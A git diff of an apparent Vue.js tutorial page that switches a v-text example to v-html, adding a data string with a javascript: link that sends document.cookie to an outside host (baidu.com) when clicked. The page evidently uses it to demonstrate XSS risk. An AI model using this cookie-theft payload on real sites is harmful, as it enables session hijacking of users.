@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>v-text指令</title>
+    <title>v-html指令</title>
     <script type="text/javascript" src="../js/vue.js"></script>
 </head>
 <body>
     <!-- 容器 -->
     <div id="root">
-        <!-- 插值语法，更灵活 -->
         <div>你好，{{name}}</div><br>
-        <!-- 顾名思义，功能就是向其所在的标签插入文本，会把原先标签里的文本内容替换掉 -->
-        <div v-text="name"></div>
         <div v-text="str"></div>
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+
     </div>
 </body>
 <script type="text/javascript">
@@ -23,7 +23,8 @@
         el:'#root',
         data:{
             name:'于适',
-            str:'<h3>谷江山</h3>'
+            str:'<h3>谷江山</h3>',
+            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>click me!</a>'
         }
     })
 </script>
